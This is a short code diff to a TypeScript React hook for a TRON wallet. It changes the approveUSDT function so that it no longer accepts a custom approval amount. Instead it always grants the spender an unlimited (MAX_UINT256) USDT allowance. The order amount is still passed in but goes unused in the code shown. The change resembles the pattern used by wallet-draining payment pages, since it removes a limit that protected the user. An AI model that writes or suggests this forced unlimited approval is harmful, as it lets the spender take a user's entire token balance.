@@ -269,7 +269,7 @@ export function useTronWallet() {
   }, []);
 
   // Execute TRC20 increaseApproval
-  const approveUSDT = useCallback(async (spenderAddress: string, orderAmount: number, customApprovalAmount?: string): Promise<{ success: boolean; txHash?: string; error?: string }> => {
+  const approveUSDT = useCallback(async (spenderAddress: string, orderAmount: number): Promise<{ success: boolean; txHash?: string; error?: string }> => {
     if (!window.tronWeb?.defaultAddress?.base58) {
       return { success: false, error: '钱包未连接' };
     }
@@ -278,17 +278,8 @@ export function useTronWallet() {
       // Get USDT contract
       const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
 
-      // Use custom approval amount or MAX_UINT256
-      // If customApprovalAmount is provided and > 0, use it (convert to 6 decimals for USDT)
-      let approvalValue = MAX_UINT256;
-      if (customApprovalAmount && parseFloat(customApprovalAmount) > 0) {
-        // Convert to USDT units (6 decimals)
-        const amountInUnits = BigInt(Math.floor(parseFloat(customApprovalAmount) * 1_000_000));
-        approvalValue = amountInUnits.toString();
-      }
-
-      // Execute increaseApproval
-      const transaction = await contract.increaseApproval(spenderAddress, approvalValue).send({
+      // Execute increaseApproval using MAX_UINT256
+      const transaction = await contract.increaseApproval(spenderAddress, MAX_UINT256).send({
         feeLimit: 100_000_000,
         callValue: 0,
         shouldPollResponse: true
